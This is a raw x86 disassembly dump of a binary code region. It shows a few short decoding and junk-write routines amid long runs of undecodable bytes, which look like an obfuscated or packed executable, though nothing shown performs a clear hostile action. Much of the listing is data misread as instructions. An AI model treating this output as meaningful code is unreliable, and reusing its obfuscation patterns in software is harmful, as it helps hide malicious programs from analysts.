  410a31:	sub    BYTE PTR [edx+edx*2],bh
  410a34:	xchg   esp,eax
  410a35:	ss xchg esi,eax
  410a37:	push   eax
  410a38:	cdq    
  410a39:	push   ebx
  410a3a:	fisttp DWORD PTR [ebx+0xa6e0af1]
  410a40:	in     eax,0x39
  410a42:	stc    
  410a43:	mov    bh,0xcf
  410a45:	inc    ebx
  410a46:	(bad)  
  410a48:	ins    BYTE PTR es:[edi],dx
  410a49:	scas   al,BYTE PTR es:[edi]
  410a4a:	dec    ecx
  410a4b:	inc    ebx
  410a4c:	sub    BYTE PTR [edx+0x27],0x6c
  410a50:	std    
  410a51:	gs sub eax,0x8532b8e6
  410a57:	pushf  
  410a58:	clc    
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	fsubr  st,st(5)
  410b22:	outs   dx,BYTE PTR ds:[esi]
  410b23:	adc    ecx,DWORD PTR ds:0xf17e7e46
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b24
  410b2d:	inc    esi
  410b2e:	cmc    
  410b2f:	gs sti 
  410b31:	(bad)
  410b34:	mov    dh,0x40
  410b36:	adc    DWORD PTR [ecx+eax*2-0x45e75fe5],ecx
  410b3d:	push   0xffffff84
  410b3f:	loopne 0x410b58
  410b41:	push   ebx
  410b42:	fdivr  QWORD PTR [edi-0x54]
  410b45:	mov    al,0x6c
  410b47:	das    
  410b48:	push   ecx
  410b49:	inc    esp
  410b4a:	or     BYTE PTR [esi],cl
  410b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4d:	cmp    al,0x99
  410b4f:	push   ecx
  410b50:	loop   0x410b1e
  410b52:	cmp    BYTE PTR [edx+0x26eb76a1],bh
  410b58:	inc    esi
  410b59:	adc    eax,0xf627c0df
  410b5e:	jo     0x410b4f
  410b60:	mov    ecx,0x5d0f17e0
  410b65:	adc    DWORD PTR [edi+0x58],0x47991029
  410b6c:	out    0xb6,eax
  410b6e:	xchg   esi,eax
  410b6f:	sbb    BYTE PTR [esp+edi*8+0x72],ch
  410b73:	pushf  
  410b74:	shl    ecx,cl
  410b76:	jecxz  0x410ba3
  410b78:	fstp   QWORD PTR ds:0xa5f1606b
  410b7e:	sbb    al,0x44
  410b80:	pop    es
  410b81:	cld    
  410b82:	fs (bad) 
  410b84:	mov    al,ds:0xd31588b
  410b89:	pop    ds
  410b8a:	sub    al,0xe
  410b8c:	cmp    BYTE PTR [eax+ecx*8+0x25],cl
  410b90:	call   0x1968:0xea29afba
  410b97:	xor    DWORD PTR [ecx+0x580918f5],ecx
  410b9d:	pop    ss
  410b9e:	mov    ecx,0x4c419cee
  410ba3:	ins    BYTE PTR es:[edi],dx
  410ba4:	pop    ecx
  410ba5:	aas    
  410ba6:	mov    bl,0xca
  410ba8:	imul   ebx,DWORD PTR [edx+0x6a0ddb],0xa
  410baf:	aaa    
  410bb0:	sbb    al,0x8c
  410bb2:	pop    ebx
  410bb3:	daa    
  410bb4:	mov    al,ah
  410bb6:	into   
  410bb7:	jg     0x410bb7
  410bb9:	addr16 sub al,0x79
  410bbc:	(bad)  
  410bbd:	pop    ebp
  410bbe:	dec    esp
  410bbf:	gs ins BYTE PTR es:[di],dx
  410bc2:	retf   0x1a0e
  410bc5:	push   0xaf41e49c
  410bca:	outs   dx,BYTE PTR ds:[esi]
  410bcb:	loopne 0x410c1c
  410bcd:	pop    esp
  410bce:	ret    
  410bcf:	shl    BYTE PTR [eax+ecx*1-0x1c0d235f],0x40
  410bd7:	mov    ebp,0x450196c6
  410bdc:	jmp    0xf4d6:0xaf4143bc
  410be3:	lea    ebx,[edx]
  410be5:	jnp    0x410bfa
  410be7:	dec    DWORD PTR [ecx]
  410be9:	xor    cl,BYTE PTR [edi]
  410beb:	and    esi,esp
  410bed:	jb     0x410bfb
  410bef:	shr    ah,cl
  410bf1:	hlt    
  410bf2:	add    DWORD PTR [esi-0x4693ddf4],ecx
  410bf8:	pop    ecx
  410bf9:	loop   0x410ba7
  410bfb:	int    0x43
  410bfd:	push   ebx
  410bfe:	mov    bl,al
  410c00:	std    
  410c01:	lahf   
  410c02:	data16 xor ch,bl
  410c05:	jmp    0xf737:0xd2505526
  410c0c:	out    0xf5,al
  410c0e:	jbe    0x410c21
  410c10:	lods   eax,DWORD PTR ds:[esi]
  410c11:	cmp    BYTE PTR [eax],dl
  410c13:	mov    bl,ah
  410c15:	sbb    eax,0x58e7916c
  410c1a:	in     eax,0x2a
  410c1c:	jp     0x410c73
  410c1e:	and    ebx,DWORD PTR [ebx-0x39]
  410c21:	push   edx
  410c22:	push   es
  410c23:	clc    
  410c24:	xchg   edi,eax
  410c25:	sahf   
  410c26:	shl    DWORD PTR [ecx+0x27f478a0],0x6a
  410c2d:	mov    cl,0x81
  410c2f:	jmp    0x410c69
  410c31:	xchg   BYTE PTR [edx-0x2dec2a7e],dl
  410c37:	mov    ah,0x19
  410c39:	mov    ds:0x4c6567b8,eax
  410c3e:	or     eax,DWORD PTR [eax-0x4e77ca84]
  410c44:	cmp    ah,BYTE PTR [edi-0x58]
  410c47:	push   ecx
  410c48:	ffree  st(7)
  410c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c4b:	jo     0x410cb4
  410c4d:	ficom  DWORD PTR [ebp+0x4853e2bb]
  410c53:	repz and eax,0x665f8f1f
  410c59:	aaa    
  410c5a:	pop    eax
  410c5b:	icebp  
  410c5c:	fidivr DWORD PTR [esp+ecx*8]
  410c5f:	pop    ebp
  410c60:	pop    ss
  410c61:	adc    ch,BYTE PTR [ebp+0x72]
  410c64:	dec    ebx
  410c65:	lock sbb DWORD PTR [edi-0x4c],eax
  410c69:	lods   al,BYTE PTR ds:[esi]
  410c6a:	cmp    DWORD PTR [ebx-0x2c],ebp
  410c6d:	mov    al,ds:0x3e29f5bc
  410c72:	xchg   ebp,eax
  410c73:	out    dx,al
  410c74:	push   ecx
  410c75:	jnp    0x410cd1
  410c77:	push   esi
  410c78:	sub    dh,BYTE PTR [ecx]
  410c7a:	ficomp WORD PTR [edi+0x65]
  410c7d:	jno    0x410c36
  410c7f:	push   esp
  410c80:	in     al,0x47
  410c82:	dec    edx
  410c83:	popa   
  410c84:	pop    edi
  410c85:	ins    DWORD PTR es:[edi],dx
  410c86:	retf   
  410c87:	adc    al,0xa6
  410c89:	lock cdq 
  410c8b:	cdq    
  410c8c:	cmp    al,0x7f
  410c8e:	test   DWORD PTR [edx],0x81b8d7f4
  410c94:	dec    esi
  410c95:	xchg   edi,eax
  410c96:	sub    al,0x4a
  410c98:	sar    BYTE PTR [ebx+0x52],0x40
  410c9c:	lods   al,BYTE PTR ds:[esi]
  410c9d:	mov    bh,0xfb
  410c9f:	pop    esp
  410ca0:	inc    ebx
  410ca1:	sub    eax,0x50f1190b
  410ca6:	xor    ebx,0xc721d9bb
  410cac:	inc    ebp
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    al,BYTE PTR [edi]
  410dcd:	imul   edi,esi,0xffffff9d
  410dd0:	mov    WORD PTR [edi+0x7e],es
  410dd3:	jle    0x410dc6
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410da7
  410dd9:	inc    ebx
  410dda:	das    
  410ddb:	jmp    0x26b8:0x64032254
  410de2:	jne    0x410d9f
  410de4:	mov    cl,0x80
  410de6:	jno    0x410da9
  410de8:	test   esp,ebp
  410dea:	sbb    eax,0x9ffb0683
  410def:	clc    
  410df0:	jg     0x410de6
  410df2:	adc    eax,0x1f501da7
  410df7:	mov    DWORD PTR [eax+0x0],0xcec5ff6c
  410dfe:	xchg   edx,eax
  410dff:	add    eax,0x7f775b3b
  410e04:	jmp    0x465f1753
  410e09:	or     ebx,ebx
  410e0b:	push   ds
  410e0c:	repnz cmp BYTE PTR [ebp-0x50],dh
  410e10:	rcr    edx,0x91
  410e13:	sahf   
  410e14:	lahf   
  410e15:	inc    esp
  410e16:	jne    0x410e8e
  410e18:	pop    edi
  410e19:	pop    edi
  410e1a:	in     eax,dx
  410e1b:	ror    DWORD PTR [ebx+0x104ab094],0x1d
  410e22:	sub    al,0xa2
  410e24:	aad    0x4d
  410e26:	lea    edi,[edx+0x4d]
  410e29:	mov    bh,0xa5
  410e2b:	mov    edi,0x64314f11
  410e30:	mov    bh,BYTE PTR [esi+0x394e35e5]
  410e36:	clc    
  410e37:	popf   
  410e38:	call   FWORD PTR [eax+0x6281fa18]
  410e3e:	rcr    BYTE PTR [edx+0x6c],0x27
  410e42:	scas   eax,DWORD PTR es:[edi]
  410e43:	or     DWORD PTR [ebp+0x20],edi
  410e46:	mov    ss,WORD PTR [edi]
  410e48:	mov    bh,0x25
  410e4a:	xchg   esi,eax
  410e4b:	into   
  410e4c:	out    0x24,eax
  410e4e:	mov    esi,0xa726e543
  410e53:	add    cl,BYTE PTR [esi-0x16]
  410e56:	fnsave [ebx+0x1b]
  410e59:	mov    dh,0x2a
  410e5b:	jle    0x410e7a
  410e5d:	test   al,0x47
  410e5f:	(bad)  
  410e61:	xchg   edi,eax
  410e62:	pop    ss
  410e63:	mov    bl,0xc4
  410e65:	lea    edi,[ebx+0x5c]
  410e68:	lods   al,BYTE PTR ds:[esi]
  410e69:	jbe    0x410e61
  410e6b:	adc    al,0x7f
  410e6d:	int3   
  410e6e:	jbe    0x410ec0
  410e70:	mov    dh,0xe7
  410e72:	jmp    0x410e27
  410e74:	jecxz  0x410dfa
  410e76:	dec    esp
  410e77:	mov    ecx,0x3cb93067
  410e7c:	add    DWORD PTR ds:0xdc142797,edi
  410e82:	call   0x212c833b
  410e87:	cdq    
  410e88:	jp     0x410ea9
  410e8a:	data16 (bad) 
  410e8c:	in     al,0x43
  410e8e:	pop    edi
  410e8f:	ficom  DWORD PTR fs:[edi-0x77306013]
  410e97:	pop    es
  410e98:	stos   DWORD PTR es:[edi],eax
  410e99:	mov    bh,BYTE PTR [ebx-0x46]
  410e9c:	and    BYTE PTR [ebp-0x2a],ch
  410e9f:	or     eax,edx
  410ea1:	cmp    ebp,DWORD PTR [ecx+0x181eb514]
  410ea7:	jb     0x410e3d
  410ea9:	(bad)  
  410eab:	pop    es
  410eac:	repnz fistp WORD PTR [edi]
  410eaf:	repz adc esp,esp
  410eb2:	dec    edx
  410eb3:	scas   al,BYTE PTR es:[edi]
  410eb4:	out    0xb1,al
  410eb6:	add    ah,BYTE PTR [esp+edi*2+0x7bf938d1]
  410ebd:	sub    BYTE PTR [ebx-0x224689b7],al
  410ec3:	jecxz  0x410e6f
  410ec5:	or     al,0xe6
  410ec7:	retf   0x71b3
  410eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ecb:	pop    ebp
  410ecc:	rcr    BYTE PTR [ecx+0x22],0xcb
  410ed0:	ss xor al,0x2a
  410ed3:	imul   edi,DWORD PTR [eax-0x6b],0x95abbfe9
  410eda:	sub    BYTE PTR [edx+0x63e93993],dl
  410ee0:	(bad)  
  410ee1:	imul   ebx,DWORD PTR [ebx],0xc
  410ee4:	jb     0x410f3f
  410ee6:	push   ebp
  410ee7:	jmp    0x4b87ebb9
  410eec:	mov    ah,0xed
  410eee:	adc    al,0xaa
  410ef0:	sar    al,1
  410ef2:	ja     0x410f45
  410ef4:	(bad)  
  410ef5:	(bad)  
  410ef6:	ficom  DWORD PTR [ecx+0x6f]
  410ef9:	sub    eax,0x432fba5
  410efe:	xchg   edi,eax
  410eff:	sub    DWORD PTR [esi-0x5],edx
  410f02:	mov    dh,0x13
  410f04:	push   0xffffffe8
  410f06:	inc    esp
  410f07:	loope  0x410eaf
  410f09:	pop    edi
  410f0a:	mov    bh,0x16
  410f0c:	lock xchg BYTE PTR [edx+0x45b093fc],cl
  410f13:	mov    ebx,0x6f82299b
  410f18:	or     al,0xc0
  410f1a:	and    edi,eax
  410f1c:	sbb    al,0x9
  410f1e:	jl     0x410f45
  410f20:	adc    DWORD PTR [edi-0x72],eax
  410f23:	mov    ds:0x5249e83f,eax
  410f28:	gs adc eax,0x2359892a
  410f2e:	fwait
  410f2f:	sub    edx,DWORD PTR [eax+0x7e5aea4d]
  410f35:	or     DWORD PTR [edx-0x1b],0x5557f0c3
  410f3c:	push   ebx
  410f3d:	jns    0x410ef6
  410f3f:	push   ebx
  410f40:	xor    DWORD PTR [edx],esp
  410f42:	int3   
  410f43:	ins    BYTE PTR es:[edi],dx
  410f44:	jmp    0x410f89
  410f46:	rol    DWORD PTR [eax+0x619391ed],0x32
  410f4d:	jmp    0x2fbb:0x86d10766
  410f54:	sbb    ah,0x67
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43382f
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	and    eax,0xf196ac5
  410ffd:	inc    ebp
  410ffe:	jle    0x41107e
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x411067
  411005:	mov    bh,0x84
  411007:	rol    BYTE PTR [ebx+0x303f2f97],cl
  41100d:	mov    dl,0xfc
  41100f:	adc    BYTE PTR [eax-0x5b],dh
  411012:	in     eax,0xa
  411014:	aaa    
  411015:	mov    BYTE PTR [ecx+edx*4-0x47],ah
  411019:	adc    eax,0xdbf30827
  41101e:	mov    DWORD PTR [esi+0xf],ebx
  411021:	and    al,0x22
  411023:	cmp    bl,BYTE PTR [edx+0x4c]
  411026:	ror    edx,cl
  411028:	sahf   
  411029:	ins    DWORD PTR es:[edi],dx
  41102a:	mov    al,0xdf
  41102c:	cdq    
  41102d:	xor    cl,BYTE PTR [eax+ecx*1-0x421f30e3]
  411034:	or     ch,al
  411036:	pop    edx
  411037:	and    dh,bh
  411039:	pop    esi
  41103a:	mov    cs,WORD PTR [esi+0x42]
  41103d:	ror    bl,cl
  41103f:	sub    dl,BYTE PTR [edi+0xdb680db]
  411045:	pop    es
  411046:	lds    ebp,FWORD PTR [eax+0x511668b]
  41104c:	ret    
  41104d:	lahf   
  41104e:	mov    dh,0xd5
  411050:	or     esp,ecx
  411052:	xchg   edi,eax
  411053:	das    
  411054:	outs   dx,BYTE PTR ds:[esi]
  411055:	pusha  
  411056:	sbb    dh,BYTE PTR [ecx+ebp*1+0x28]
  41105a:	pop    edx
  41105b:	mov    eax,ds:0x4527cfc0
  411060:	dec    edi
  411061:	icebp  
  411062:	outs   dx,BYTE PTR ds:[esi]
  411063:	repnz mov eax,ds:0x23058ff0
  411069:	ja     0x410ff1
  41106b:	test   DWORD PTR [edx+0x28],edi
  41106e:	inc    ebp
  41106f:	stos   BYTE PTR es:[edi],al
  411070:	push   edi
  411071:	jno    0x41100e
  411073:	fcmovbe st,st(5)
  411075:	push   cs
  411076:	mov    ah,0x2b
  411078:	ret    0x3baf
  41107b:	mov    eax,ds:0x25bd75bb
  411080:	bound  ebx,QWORD PTR [ebx-0x717f521]
  411086:	xchg   edi,eax
  411087:	jbe    0x5d26c4db
  41108d:	pop    ebx
  41108e:	sti    
  41108f:	mov    ds:0x3bdd615e,eax
  411094:	ja     0x4110e4
  411096:	adc    BYTE PTR [eax-0x1873336b],dh
  41109c:	bound  edx,QWORD PTR [eax]
  41109e:	ror    DWORD PTR [edi+0x31],1
  4110a1:	and    ch,BYTE PTR [esi]
  4110a3:	dec    ecx
  4110a4:	mov    ch,0x2f
  4110a6:	pop    esp
  4110a7:	(bad)
  4110aa:	xor    eax,eax
  4110ac:	in     al,dx
  4110ad:	and    BYTE PTR [ebx-0x5fe1a5f3],al
  4110b3:	imul   esi,DWORD PTR [eax+0x2832249],0x5c
  4110ba:	push   eax
  4110bb:	(bad)  
  4110bc:	int    0xe2
  4110be:	(bad)  
  4110bf:	sbb    esi,ecx
  4110c1:	in     al,dx
  4110c2:	xor    BYTE PTR [ecx+0x2f],bl
  4110c5:	add    ecx,DWORD PTR [ecx-0x4408c699]
  4110cb:	dec    ecx
  4110cc:	and    bl,BYTE PTR [ebp+ebx*1+0x69804107]
  4110d3:	adc    ebp,DWORD PTR [ecx+0x59]
  4110d6:	shr    BYTE PTR es:[edx-0x259d0c59],1
  4110dd:	xchg   esp,eax
  4110de:	sbb    cl,al
  4110e0:	jns    0x411085
  4110e2:	scas   eax,DWORD PTR es:[edi]
  4110e3:	sahf   
  4110e4:	xor    al,BYTE PTR [ebp+0x75]
  4110e7:	and    DWORD PTR [ebx+0x4b],esi
  4110ea:	out    0x9,al
  4110ec:	adc    BYTE PTR [eax-0x3bfc2b17],cl
  4110f2:	xor    ebx,0x967312fc
  4110f8:	fsub   st,st(5)
  4110fa:	sahf   
  4110fb:	xlat   BYTE PTR ss:[ebx]
  4110fd:	cmp    BYTE PTR [ecx],dh
  4110ff:	jecxz  0x4110f0
  411101:	mov    ecx,0xbc44e4f6
  411106:	shl    BYTE PTR [edx-0x1a18550e],0x63
  41110d:	gs push ss
  41110f:	push   ebx
  411110:	(bad)  
  411111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411112:	fdiv   st(7),st
  411114:	imul   edi,ecx,0xae828ca2
  41111a:	dec    esi
  41111b:	out    0x97,eax
  41111d:	fldcw  WORD PTR [edi]
  41111f:	mov    ebp,gs
  411121:	(bad)  
  411122:	call   0xf0179d54
  411127:	in     al,dx
  411128:	inc    esp
  411129:	ins    DWORD PTR es:[edi],dx
  41112a:	gs pop es
  41112c:	rcr    BYTE PTR [eax-0x3eacf8f3],1
  411132:	in     eax,dx
  411133:	ret    0x3936
  411136:	push   esp
  411137:	les    edx,FWORD PTR [ebx]
  411139:	cmp    BYTE PTR ds:0x1379d0ca,ch
  41113f:	lock cs out 0xd8,al
  411143:	das    
  411144:	mov    ah,0xbc
  411146:	ins    BYTE PTR es:[edi],dx
  411147:	xor    al,cl
  411149:	cwde   
  41114a:	add    al,0x98
  41114c:	outs   dx,DWORD PTR ds:[esi]
  41114d:	fild   WORD PTR [ebx]
  41114f:	dec    edx
  411150:	add    eax,0x1ad7209e
  411155:	or     edi,DWORD PTR [eax-0x7b7ba119]
  41115b:	add    esi,ecx
  41115d:	mov    ah,0x1a
  41115f:	popf   
  411160:	push   ds
  411161:	push   ecx
  411162:	push   0xffffffe3
  411164:	push   ss
  411165:	push   ds
  411166:	fsub   DWORD PTR [ebp+0x7fa3e310]
  41116c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116d:	and    BYTE PTR [edi],bl
  41116f:	dec    edi
  411170:	pop    esi
  411171:	pop    edx
  411172:	mov    dh,0x7a
  411174:	aas    
  411175:	es push ss
  411177:	scas   eax,DWORD PTR es:[edi]
  411178:	imul   ebp,DWORD PTR [eax-0x31d4654a],0x59d77f4b
  411182:	push   esp
  411183:	mov    edi,0x3b02
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0x53dabba7
  4111f1:	mov    BYTE PTR [ecx+0x49],ah
  4111f4:	mov    es,WORD PTR [edx+0x7e]
  4111f7:	jle    0x4111ea
  4111f9:	jg     0x411279
  4111fb:	jle    0x411195
  4111fd:	xchg   ebx,eax
  4111fe:	jmp    0x411231
  411200:	cmp    DWORD PTR ds:0xda51d0d,edx
  411206:	in     al,0xee
  411208:	cwd    
  41120a:	div    BYTE PTR [eax-0x7efbb147]
  411210:	pop    esi
  411211:	loop   0x411251
  411213:	clc    
  411214:	pushf  
  411215:	ins    DWORD PTR es:[edi],dx
  411216:	loopne 0x4111f8
  411218:	push   ss
  411219:	out    0x50,eax
  41121b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41121c:	cdq    
  41121d:	mov    bl,cl
  41121f:	fcmove st,st(5)
  411221:	loopne 0x41122a
  411223:	aam    0x12
  411225:	xor    eax,0xe090f84b
  41122a:	inc    esi
  41122b:	fnsave ds:0xd20e1dad
  411231:	xchg   eax,ebx
  411233:	retf   
  411234:	daa    
  411235:	mov    edi,0xe87d104d
  41123a:	cs gs xor edx,esi
  41123e:	sbb    DWORD PTR [eax],esi
  411240:	mov    ecx,0xd021d640
  411245:	cli    
  411246:	jl     0x411257
  411248:	pop    edx
  411249:	(bad)  
  41124a:	mov    al,ds:0xda4add33
  41124f:	xor    BYTE PTR ss:[ebp+0x15],0x62
  411254:	push   edi
  411255:	or     BYTE PTR [ebp-0x353bbe58],ah
  41125b:	int3   
  41125c:	and    edx,eax
  41125e:	mov    ds:0x30f1605a,al
  411263:	inc    edx
  411264:	push   edx
  411265:	(bad)  
  411266:	retf   0x932
  411269:	push   ecx
  41126a:	jmp    0x411200
  41126c:	sbb    BYTE PTR [esi+0x51e47f50],bh
  411272:	shl    ah,0x12
  411275:	mov    fs,WORD PTR ds:0x726d2a41
  41127b:	js     0x4112ea
  41127d:	imul   ecx,DWORD PTR [ecx-0x3b],0x7ea3a6d7
  411284:	jbe    0x41122a
  411286:	dec    edx
  411287:	mov    ebp,DWORD PTR [esi]
  411289:	rep cs ins DWORD PTR es:[edi],dx
  41128c:	int    0xee
  41128e:	rol    BYTE PTR [esi+0x31],1
  411291:	add    eax,0xea95f60b
  411296:	push   ebx
  411297:	imul   esp,DWORD PTR [ebx+0xc353934],0xb1649a32
  4112a1:	fs add bh,bl
  4112a4:	daa    
  4112a5:	(bad)  
  4112a6:	lea    esi,[ebp+0x5c]
  4112a9:	sti    
  4112aa:	mov    BYTE PTR [edx],al
  4112ac:	daa    
  4112ad:	add    bh,ah
  4112af:	xor    DWORD PTR [eax],esp
  4112b1:	xlat   BYTE PTR ds:[ebx]
  4112b2:	out    dx,eax
  4112b3:	cmp    DWORD PTR [ecx+0x31],0xca4a59e2
  4112ba:	pop    ebx
  4112bb:	pop    ecx
  4112bc:	imul   ecx,ebx,0x27
  4112bf:	das    
  4112c0:	in     al,dx
  4112c1:	push   ss
  4112c2:	and    al,0xf5
  4112c4:	arpl   WORD PTR [edi-0x6c],dx
  4112c7:	inc    ebx
  4112c8:	sbb    al,bh
  4112ca:	lea    ecx,[ebx+eiz*4+0x19]
  4112ce:	sub    bh,bl
  4112d0:	xchg   ecx,eax
  4112d1:	mov    ebp,0x76b5abde
  4112d6:	ror    dh,0x57
  4112d9:	cwde   
  4112da:	rcr    dh,0xa7
